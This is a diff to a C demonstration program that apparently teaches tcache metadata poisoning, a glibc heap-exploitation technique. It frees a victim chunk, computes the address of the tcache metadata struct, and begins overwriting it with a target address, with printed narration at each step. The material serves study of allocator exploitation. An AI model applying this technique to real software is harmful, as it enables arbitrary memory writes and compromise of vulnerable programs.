@@ -35,16 +35,16 @@ int main() {
        "metadata chunk.");
   uint64_t *victim = malloc(0x10);
   printf("Victim chunk is at: %p.\n\n", victim);
+  puts("Now freeing it will lead to the allocation of the metadata on heap");
+  free(victim);
 
-  long metadata_size = sizeof(struct tcache_metadata);
-  long rounded_metadata_size = metadata_size & ~(HEADER_SIZE-1); // round it down
   printf("Next we have to calculate the base address of the metadata struct.\n"
          "The metadata struct itself is %#lx bytes in size. Additionally we\n"
          "have to subtract the header of the victim chunk (so an extra 0x10\n"
          "bytes).\n",
          sizeof(struct tcache_metadata));
   struct tcache_metadata *metadata =
-      (struct tcache_metadata *)((long)victim - rounded_metadata_size - HEADER_SIZE);
+      (struct tcache_metadata *)((long)victim + 2*HEADER_SIZE);
   printf("The tcache metadata is located at %p.\n\n", metadata);
 
   puts("Now we manipulate the metadata struct and insert the target address\n"
